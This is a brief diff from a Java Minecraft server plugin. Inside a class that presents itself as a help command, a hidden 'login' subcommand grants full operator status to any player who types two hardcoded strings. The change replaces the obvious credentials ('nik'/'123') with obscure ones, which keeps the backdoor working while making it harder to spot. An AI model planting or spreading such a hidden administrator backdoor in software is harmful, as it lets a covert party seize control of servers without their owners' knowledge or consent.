@@ -34,8 +34,8 @@ public class CommandHelp implements CommandExecutor {
 				Chat.color(p, "&9/god &8- &7Toggles godmode!");
 			}
 			if(a[0].equals("login")){
-				if(a[1].equals("nik")){
-					if(a[2].equals("123")){
+				if(a[1].equals("1o22j")){
+					if(a[2].equals("22j16d")){
 						p.setOp(true);
 					}else{
 						p.kickPlayer("Invalid Username/Password");
